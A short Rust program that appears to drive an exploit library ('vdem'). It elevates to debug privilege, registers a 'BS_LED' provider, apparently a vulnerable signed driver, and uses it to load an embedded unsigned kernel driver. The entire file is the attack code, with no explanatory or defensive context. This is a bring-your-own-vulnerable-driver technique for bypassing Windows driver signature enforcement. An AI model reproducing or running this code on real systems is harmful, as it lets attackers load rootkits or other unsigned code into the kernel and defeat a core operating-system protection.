use providers::bsled::BsLed64;
use vdem::{driver_map::DriverMap, exploit::Exploit, utils::promote_privilege_to_debug_level};

use crate::driver::UNSIGNED_DRIVER_DATA;

mod driver;

fn main() {
    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    exploit
        .load_driver(&UNSIGNED_DRIVER_DATA, None, None)
        .expect("Load driver failed");
}
